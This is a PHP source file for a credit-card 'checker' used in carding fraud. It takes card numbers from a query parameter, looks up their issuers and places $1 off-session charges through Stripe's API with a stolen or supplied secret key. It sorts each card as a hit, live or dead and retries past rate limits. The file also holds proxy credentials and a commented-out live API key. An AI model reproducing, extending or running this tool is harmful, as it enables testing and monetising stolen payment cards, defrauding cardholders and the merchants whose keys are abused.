<?php



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

  $proxy= "http://185.132.133.232:12582";
$proxyauth ="b7ce9ef7-1015005:jqk4j65nxiq";
//  curl_setopt($ch, CURLOPT_PROXY, $proxy);
//  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
//================ [ FUNCTIONS & LISTA ] ===============//


function GetStr($string, $start, $end)
{
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string)
{
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
};
function hyper_decode($decode)
{
  $cipher = "AES-128-CTR";

  // Use OpenSSl Encryption method
  $iv_length = openssl_cipher_iv_length($cipher);
  $div = '1234567891011121';
  $options = 0;
  $d_key = "hyperencrypt";

  $decryption = openssl_decrypt(
    $decode,
    $cipher,
    $d_key,
    $options,
    $div
  );

  return $decryption;
}
function random_str($len = 10){
    $permitted_chars = '0123456789abcdefghijklmnopqrstuvwxyz';
return substr(str_shuffle($permitted_chars), 0, $len);
}
$sk_file = file("./sk.txt");
$get_sk = end($sk_file);
$skk = trim($get_sk);
$sk = $_GET['skkey'];
$genstr = "donation ".random_str();
if($sk == "HYPER"){
$sk =  hyper_decode($skk);
// $a = [
//     "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"
//     ];
// $sk =   $a[array_rand($a)];
}

$amt =  1;
// if(isset($_GET['amount'])){
//     $amt = 1;
// }
$amount = $amt * 100;
$lista = $_GET['lista'];
$cc = multiexplode(array(
    ":",
    "|",
    ""
) , $lista) [0];
$mes = multiexplode(array(
    ":",
    "|",
    ""
) , $lista) [1];
$ano = multiexplode(array(
    ":",
    "|",
    ""
) , $lista) [2];
$cvv = multiexplode(array(
    ":",
    "|",
    ""
) , $lista) [3];
if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";
$bins = substr($cc, 0, 6);
$band = array(
    "424242"
);
list($ban) = $band;
if ($bins == $ban)
{
    echo "<b>BIN BANNED!</B><br>";
}
else
{
    
    
    
    $binchk = curl_init();
curl_setopt($binchk, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($binchk, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($binchk, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($binchk, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($binchk, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($binchk, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($binchk); 
$emoji = GetStr($fim, '"emoji":"', '"'); 
if(strpos($fim, '"type":"credit"') !== false){
}
curl_close($binchk);


$binchk = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($binchk, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($binchk, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($binchk, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($binchk, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($binchk, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($binchk);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($binchk);

$bindata1 = " $type - $brand - $country $emoji";
    #-------------------[1st REQ]--------------------#  
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods'); 
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');  
$result1 = curl_exec($ch);  
$tok1 = Getstr($result1,'"id": "','"');  
$msg = Getstr($result1,'"message": "','"');  
//echo "<br><b>Result1: </b> $result1<br>";  
if (strpos($result1, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}  
  
  
#------------------[2nd REQ]--------------------#  
$cvc_check = "";
$x = 0;  
while(true)  
{  
$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
//   curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=ggg_'.$tok1.'&payment_method='.$tok1.'&confirm=true&off_session=true');  
$result2 = curl_exec($ch);  
$tok2 = Getstr($result2,'"id": "','"');  
$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
$cvc_check = trim(strip_tags(getStr($result2, '"cvc_check": "', '"')));
//echo "<br><b>Result2: </b> $result2<br>";  
if (strpos($result2, "rate_limit"))   
{  
    $x++;  
    continue;  
}  
break;  
}


    // $tok2 = Getstr($result2, '"id": "', '"');
    
    // $receipturl = trim(strip_tags(getStr($result2, '"receipt_url": "', '"')));
    
    
    $lnt = "HIDDEN";
    $ln = "#";
    if($_GET['skkey'] != "HYPER"){
        $lnt ="LINK";
        $ln =  trim(strip_tags(getStr($result2, '"receipt_url": "', '"')));
    }

    //=================== [ RESPONSES ] ===================//
    if ($cvc_check !== "pass" && $receipturl !== ""){
        $data = "[CCN Charged] $lista ";
        
        echo '#HITS</span>  </span>CC:  ' . $lista . '</span><br>Country:'.$country.'  <br>Response: $' . $amt . ' CCN Charged ✅<br>Bypassed: '.$x.'<br>Cvc: '.$cvc_check.' <br>Receipt : <a href='.$ln.'>'.$lnt.'<a><br>';
    }
    elseif (strpos($result2, '"seller_message": "Payment complete."'))
    
    {
        $data = "[CVV Charged] $lista ";
       
        echo '#HITS</span>  </span>CC:  ' . $lista . '</span><br>Country:'.$country.'  <br>Response: $' . $amt . ' Charged ✅<br>Bypassed: '.$x.'<br>Receipt : <a href='.$ln.'>'.$lnt.'<a><br>';
    
    }
    elseif (strpos($result2, '"cvc_check": "pass"'))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVV LIVE<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result1, "generic_decline"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: GENERIC DECLINED<br>Bypassed: '.$x.'</span><br>'.$cvc_check.'';
    }
    elseif (strpos($result2, "generic_decline"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: GENERIC DECLINED<br>Bypassed: '.$x.'</span><br>'.$cvc_check.'';
        // echo $result2;
        
    }
    elseif (strpos($result2, "insufficient_funds"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INSUFFICIENT FUNDS<br>Bypassed: '.$x.'</span><br>cvc - '.$cvc_check.'';
    }

    elseif (strpos($result2, "fraudulent"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: FRAUDULENT<br>Bypassed: '.$x.'</span><br>cvc - '.$cvc_check.'';
    }
    elseif (strpos($resul3, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR <br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($resul2, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR</span><br>';
    }
    elseif (strpos($result, "fraudulent"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: FRAUDULENT <br>Bypassed: '.$x.'</span><br>';

    }

    elseif (strpos($result2, '"code": "incorrect_cvc"'))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect <br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result1, ' "code": "invalid_cvc"'))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect <br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result1, "invalid_expiry_month"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INVAILD EXPIRY MONTH <br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result2, "invalid_account"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INVAILD ACCOUNT<br>Bypassed: '.$x.'</span><br>';

    }

    elseif (strpos($result2, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "lost_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: LOST CARD<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "lost_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: LOST CARD</span></span>  <br>Result: CHECKER BY Manish</span> <br>';
    }

    elseif (strpos($result2, "stolen_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: STOLEN CARD<br>Bypassed: '.$x.'</span><br>';
    }

    elseif (strpos($result2, "stolen_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: STOLEN CARD<br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result2, "transaction_not_allowed"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: TRANSACTION NOT ALLOWED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "authentication_required"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "card_error_authentication_required"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "card_error_authentication_required"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result1, "card_error_authentication_required"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: 32DS REQUIRED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "incorrect_cvc"))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Security code is incorrect<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "pickup_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PICKUP CARD<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "pickup_card"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PICKUP CARD<br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result2, 'Your card has expired.'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: EXPIRED CARD<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, 'Your card has expired.'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: EXPIRED CARD<br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result2, "card_decline_rate_limit_exceeded"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: Card Rate Limited<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"code": "processing_error"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PROCESSING ERROR<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, ' "message": "Your card number is incorrect."'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"decline_code": "service_not_allowed"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SERVICE NOT ALLOWED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"code": "processing_error"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: PROCESSING ERROR<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, ' "message": "Your card number is incorrect."'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: YOUR CARD NUMBER IS INCORRECT<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"decline_code": "service_not_allowed"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SERVICE NOT ALLOWED<br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result, "incorrect_number"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INCORRECT CARD NUMBER<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result1, "incorrect_number"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: INCORRECT CARD NUMBER<br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result1, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR<br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result1, 'Your card was declined.'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD DECLINED<br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result1, "do_not_honor"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "generic_decline"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: GENERIC CARD<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result, 'Your card was declined.'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD DECLINED<br>Bypassed: '.$x.'</span><br>';

    }
    elseif (strpos($result2, ' "decline_code": "do_not_honor"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: DO NOT HONOR<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "unchecked"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_UNCHECKED<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "fail"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_CHECK : FAIL<br>Bypassed: '.$x.'</span><br>';
    }
    elseif (strpos($result2, "card_not_supported"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "unavailable"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_CHECK : UNVAILABLE</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "unchecked"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_UNCHECKED : INFORM TO OWNER」</span><br>';
    }
    elseif (strpos($result2, '"cvc_check": "fail"'))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVC_CHECKED : FAIL</span><br>';
    }
    elseif (strpos($result2, "currency_not_supported"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CURRENCY NOT SUPORTED TRY IN INR</span><br>';
    }

    elseif (strpos($result, 'Your card does not support this type of purchase.'))
    {
        echo '#DIE</span> CC:  ' . $lista . '</span>  <br>Result: CARD NOT SUPPORT THIS TYPE OF PURCHASE</span><br>';
    }

    elseif (strpos($result2, '"cvc_check": "pass"'))
    {
        echo '#LIVE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CVV LIVE</span><br>';
    }
    elseif (strpos($result2, "fraudulent"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: FRAUDULENT</span><br>';
    }
    elseif (strpos($result1, "testmode_charges_only"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SK KEY #DIE OR INVALID</span><br>';
    }
    // elseif (strpos($result1, "rate_limit"))
    // {
    //     echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SK RATE LIMIT</span><br>';
    // }
    elseif (strpos($result1, "api_key_expired"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: SK KEY REVOKED</span><br>';
    }
    elseif (strpos($result1, "parameter_invalid_empty"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: ENTER CC TO CHECK</span><br>';
    }
    elseif (strpos($result1, "card_not_supported"))
    {
        echo '#DIE</span>  </span>CC:  ' . $lista . '</span>  <br>Result: CARD NOT SUPPORTED</span><br>';
    }
    else
    {
        echo '#DIE</span> CC:  ' . $lista . '</span>  <br>Result: ' . $result2 . ' <br><br><br>Result: ' . $result2 . '</span><br>';

    }
    curl_close($ch);
    ob_flush();
}
?>
